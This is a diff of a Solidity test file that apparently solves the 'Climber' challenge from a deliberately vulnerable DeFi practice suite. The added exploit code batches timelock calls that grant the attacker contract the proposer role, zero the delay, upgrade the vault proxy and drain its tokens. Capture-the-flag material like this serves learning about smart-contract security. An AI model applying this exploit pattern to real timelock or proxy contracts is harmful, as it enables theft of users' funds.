@@ -9,6 +9,9 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
 
+import {NewClimberVault} from "../../../src/Contracts/attacker-contracts/Climber/ClimberAttackProxy.sol";
+import {TimelockAttack} from "../../../src/Contracts/attacker-contracts/Climber/TimelockAttack.sol";
+
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
 
@@ -17,6 +20,8 @@ contract Climber is Test {
     ClimberTimelock internal climberTimelock;
     ClimberVault internal climberImplementation;
     ERC1967Proxy internal climberVaultProxy;
+    NewClimberVault internal newClimberVault;
+    TimelockAttack internal timelockAttack;
     address[] internal users;
     address payable internal deployer;
     address payable internal proposer;
@@ -88,7 +93,67 @@ contract Climber is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        timelockAttack = new TimelockAttack(
+            address(climberImplementation),
+            payable(climberTimelock),
+            address(dvt),
+            attacker
+        );
+
+        newClimberVault = new NewClimberVault();
+
+        bytes32 proposerRole = keccak256("PROPOSER_ROLE");
+
+        string memory grantRoleString = "grantRole(bytes32,address)";
+        bytes memory grantRoleData = abi.encodeWithSignature(
+            grantRoleString,
+            proposerRole,
+            address(timelockAttack)
+        );
+
+        string memory updateDelayString = "updateDelay(uint64)";
+        bytes memory updateDelayData = abi.encodeWithSignature(
+            updateDelayString,
+            0
+        );
+
+        string memory upgradeString = "upgradeTo(address)";
+        bytes memory upgradeToData = abi.encodeWithSignature(
+            upgradeString,
+            address(newClimberVault)
+        );
+
+        string memory attackString = "attack()";
+        bytes memory attackData = abi.encodeWithSignature(attackString, "");
+
+        address[] memory targets = new address[](4);
+        targets[0] = address(climberTimelock);
+        targets[1] = address(climberTimelock);
+        targets[2] = address(newClimberVault);
+        targets[3] = address(timelockAttack);
+
+        bytes[] memory data = new bytes[](4);
+        data[0] = grantRoleData;
+        data[1] = updateDelayData;
+        data[2] = upgradeToData;
+        data[3] = attackData;
+
+        uint256[] memory zero = new uint256[](4);
+        zero[0] = 0;
+        zero[1] = 0;
+        zero[2] = 0;
+        zero[3] = 0;
+
+        timelockAttack.setScheduleData(targets, data);
+
+        bytes32 salt = keccak256(abi.encodePacked(uint256(0)));
+        climberTimelock.execute(targets, zero, data, salt);
+
+        timelockAttack.withdrawFunds();
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
